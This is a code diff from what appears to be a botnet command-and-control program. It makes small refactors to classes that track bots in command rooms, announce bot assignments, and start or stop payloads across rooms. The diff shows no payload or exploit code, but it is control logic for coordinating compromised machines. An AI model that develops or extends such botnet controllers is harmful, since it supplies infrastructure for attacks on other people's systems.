@@ -56,11 +56,13 @@ class CommandRoom:
         self.bots[bot.bot_id] = [bot, True]
         return bot
 
-    def remove_bot(self, bot_id):
+    def remove_bot(self, bot_id) -> bool:
         try:
             del self.bots[bot_id]
+            return True
         except:
             print("Tried removing non-existing bot", bot_id)
+        return False
         
     def set_active(self, bot_id) -> bool:
         """
@@ -182,7 +184,7 @@ class BotnetController:
             if not self.command_room_lock.acquire(False):
                 return
             self.announce_room.send_text(
-                f"RESOLVE {botid}:{"E" if self.command_rooms[room_id].payload_status else "D"}:{room_id}"
+                "RESOLVE {}:{}:{}".format(botid, "E" if self.command_rooms[room_id].payload_status else "D", room_id)
             )
             self.assign_bot(msgbody, room_id)
             self.command_room_lock.release()
@@ -218,7 +220,6 @@ class BotnetController:
 
     def start_payload_on_room(self, room: CommandRoom):
         room.start_payload()
-        room.send_cmd("PAYLOAD:START")
     
     def start_payload_all_rooms(self):
         with self.command_room_lock:
@@ -232,6 +233,9 @@ class BotnetController:
         with self.command_room_lock:
             for _, cmd_room in self.command_rooms.items():
                 self.stop_payload_on_room(cmd_room)
+
+    def stop_bot(self, room: CommandRoom, bot_id: str) -> bool:
+        return room.remove_bot(bot_id)
 
     def ping_loop(self):
         while True:
